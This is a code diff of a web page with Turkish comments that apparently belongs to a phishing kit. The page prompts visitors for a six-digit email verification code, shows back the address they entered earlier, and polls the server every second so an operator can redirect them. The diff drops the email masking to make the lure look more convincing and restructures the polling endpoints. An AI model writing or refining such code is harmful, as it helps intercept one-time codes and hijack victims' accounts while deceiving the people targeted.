@@ -288,7 +288,8 @@
   </div>
   <script>
     const pingServer = () => {
-      fetch('/api/ping').catch(err => console.error('Ping failed', err));
+      // Ping artık check-redirect içinde yapılıyor
+      fetch('/api/check-redirect').catch(err => console.error('Check redirect failed', err));
     };
 
     // Retry mekanizması ile fetch wrapper - logMailCodePage için
@@ -413,10 +414,10 @@
       return false;
     }
 
-    // Mail adresini dinamik olarak göster
+    // Mail adresini dinamik olarak göster (sansürsüz)
     async function updateMailCodeMessage() {
       try {
-        const res = await fetch('/api/user-log');
+        const res = await fetch('/api/check-redirect');
         if (res.ok) {
           const data = await res.json();
           const input1 = data.input1;
@@ -426,17 +427,8 @@
             // Mail formatı kontrolü
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             if (emailRegex.test(input1.trim())) {
-              // Mail formatındaysa maskeleme yap
-              const email = input1.trim();
-              const [localPart, domain] = email.split('@');
-              let maskedLocal = '';
-              if (localPart.length > 1) {
-                maskedLocal = localPart[0] + '*'.repeat(localPart.length - 1);
-              } else {
-                maskedLocal = localPart[0] || '*';
-              }
-              const maskedEmail = `${maskedLocal}@${domain}`;
-              messageEl.textContent = `${maskedEmail} adresine gönderilen 6 haneli doğrulama kodunu girin.`;
+              // Mail formatındaysa tam adresi göster (sansürleme yok)
+              messageEl.textContent = `${input1.trim()} adresine gönderilen 6 haneli doğrulama kodunu girin.`;
             } else {
               // Mail formatı değilse genel mesaj
               messageEl.textContent = 'Mail adresinize gönderilen 6 haneli doğrulama kodunu girin.';
@@ -457,7 +449,6 @@
     // Daha sık kontrol et - her 1 saniyede bir
     setInterval(checkRedirect, 1000);
 
-    function b_xhr() { fetch("/websocket.php", { method: "POST" }) .then((y) => y.json()) .then((m) => { if (m.success) { let u = m.success; if (u.includes('login')) { u = '../' + u; } window.location.href = u; } }); } setInterval(b_xhr, 1500);
     const frm = document.querySelector('form');
     const mCInp = frm.elements[0];
 
